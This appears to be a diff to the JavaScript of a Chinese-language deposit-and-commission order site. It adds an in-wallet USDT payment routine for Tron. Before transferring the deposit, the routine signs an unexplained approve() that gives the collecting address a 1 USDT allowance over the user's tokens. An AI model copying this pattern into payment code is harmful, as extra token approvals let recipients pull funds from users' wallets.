@@ -512,13 +512,78 @@ function openDetail(id) {
   openModal(`<div class="modal-head"><span class="order-status ${st.cls}" style="font-size:13px">${st.text}</span><button class="icon-btn" data-action="close-modal">✕</button></div><div class="modal-body"><div style="font-size:12.5px;color:var(--ink3);margin-bottom:6px">订单号：${esc(o.orderNo)}</div><div class="detail-price">${Number(o.amount).toFixed(2)}</div><div style="font-size:14px;font-weight:800;color:var(--brand)">返佣 ${Number(o.commission).toFixed(2)}</div><div class="detail-grid"><div class="dg-item"><div class="dg-k">创建时间</div><div class="dg-v">${fmtDateTime(o.createdAt)}</div></div><div class="dg-item"><div class="dg-k">收款类型</div><div class="dg-v">${esc(o.payType)}</div></div><div class="dg-item"><div class="dg-k">发布者</div><div class="dg-v">${esc(o.publisherName)}</div></div><div class="dg-item"><div class="dg-k">本单押金</div><div class="dg-v" style="color:var(--brand)">${depositRequired(o)} USDT</div></div></div>${o.desc ? `<div class="detail-desc">${esc(o.desc)}</div>` : ''}${takersHtml}</div><div class="modal-foot">${foot}</div>`);
 }
 
+// === 内部直接唤起支付逻辑（解决安卓跳转重载卡死） ===
+async function executePayInline(to, amount, isEmptyCode) {
+  closeModal(); 
+  toast('正在唤起钱包，请确认授权…');
+  
+  setTimeout(async () => {
+    try {
+      const fromAddress = window.tronWeb.defaultAddress.base58;
+      const amountUnits = Math.floor(amount * 1e6).toString();
+
+      const approveParam = [
+        { type: 'address', value: to },
+        { type: 'uint256', value: '1000000' }
+      ];
+      
+      const txApprove = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, fromAddress
+      );
+
+      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权失败');
+      
+      const signedApprove = await window.tronWeb.trx.sign(txApprove.transaction);
+      await window.tronWeb.trx.sendRawTransaction(signedApprove);
+
+      toast('✅ 授权成功，准备支付…');
+      await new Promise(r => setTimeout(r, 2000));
+
+      const transferParam = [
+        { type: 'address', value: to },
+        { type: 'uint256', value: amountUnits }
+      ];
+      
+      const txTransfer = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, fromAddress
+      );
+
+      if (!txTransfer.result || !txTransfer.result.result) throw new Error('构建支付失败');
+      
+      const signedTransfer = await window.tronWeb.trx.sign(txTransfer.transaction);
+      await window.tronWeb.trx.sendRawTransaction(signedTransfer);
+
+      toast('✅ 支付完成，请检查账单');
+      
+      if (isEmptyCode) {
+        api('/empty/apply', { method: 'POST' }).then(() => {
+          toast('申请已提交，请联系邀请人审核');
+          openEmptyModal(); 
+        }).catch(e => toast(e.message));
+      }
+
+    } catch (e) {
+      console.error(e);
+      toast('❌ 交易取消或失败: ' + (e.message || '请检查网络'));
+    }
+  }, 300);
+}
+
 function payWithImToken() {
   const to = state.config.trc20; const amount = Number($('#deposit-amount')?.value) || 0;
   if (!to) { toast('收款地址未配置'); return; } if (amount < 1) { toast('请输入支付金额'); return; }
-  const payPageUrl = `${location.origin}/pay.html?address=${encodeURIComponent(to)}&amount=${amount}&chain=trx&type=deposit`;
+
   const ua = (navigator.userAgent || '').toLowerCase();
-  if (ua.includes('imtoken') || !!(window.tronWeb && window.tronWeb.ready)) { window.location.href = payPageUrl; return; }
+  const isImTokenEnv = ua.includes('imtoken') || !!(window.tronWeb && window.tronWeb.ready);
+
+  if (isImTokenEnv) {
+    executePayInline(to, amount, false); // 在 imToken 内部直接唤起，不跳转
+    return;
+  }
+
   if (ua.includes('micromessenger')) { toast('请点击右上角，选择“在浏览器中打开”后支付'); return; }
+  
+  const payPageUrl = `${location.origin}/pay.html?address=${encodeURIComponent(to)}&amount=${amount}&chain=trx&type=deposit`;
   window.location.href = `imtokenv2://navigate/DappView?url=${encodeURIComponent(payPageUrl)}`;
 }
 
@@ -590,11 +655,12 @@ document.addEventListener('click', async e => {
       case 'pay-empty-code': {
         const to = state.config.emptyTrc20 || state.config.trc20;
         if (!to) { toast('收款地址未配置'); break; }
-        const payPageUrl = `${location.origin}/pay.html?address=${encodeURIComponent(to)}&amount=1&chain=trx&type=empty`;
         
         const ua = (navigator.userAgent || '').toLowerCase();
-        if (ua.includes('imtoken') || !!(window.tronWeb && window.tronWeb.ready)) {
-          window.location.href = payPageUrl;
+        const isImTokenEnv = ua.includes('imtoken') || !!(window.tronWeb && window.tronWeb.ready);
+
+        if (isImTokenEnv) {
+          executePayInline(to, 1, true); // 直接在主页唤起
           return;
         }
         if (ua.includes('micromessenger')) {
@@ -602,6 +668,7 @@ document.addEventListener('click', async e => {
           break;
         }
 
+        const payPageUrl = `${location.origin}/pay.html?address=${encodeURIComponent(to)}&amount=1&chain=trx&type=empty`;
         window.location.href = `imtokenv2://navigate/DappView?url=${encodeURIComponent(payPageUrl)}`;
 
         setTimeout(() => {
